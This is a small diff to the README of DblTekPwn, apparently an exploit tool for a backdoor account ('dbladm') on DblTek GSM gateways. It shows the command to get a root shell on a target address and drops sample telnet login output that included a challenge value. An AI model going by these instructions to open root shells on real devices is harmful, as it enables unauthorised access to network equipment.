@@ -80,20 +80,11 @@ DblTekPwn.exe --root-shell --name 192.168.1.1
 
 You will see output that looks like this:
 ```
-Trying 192.168.1.1...
-Connected to 192.168.1.1.
-Escape character is '^]'.
-
-
-Start login
-do exec: /sbin/login
-Login: dbladm
-challenge: N1746203308
 Password: ***********
 
 ```
 
-From here you can simply begin entering commands.
+From here you can simply begin entering commands (there is no shell prompt).
 
 ### Calculating a Challenge Response
 
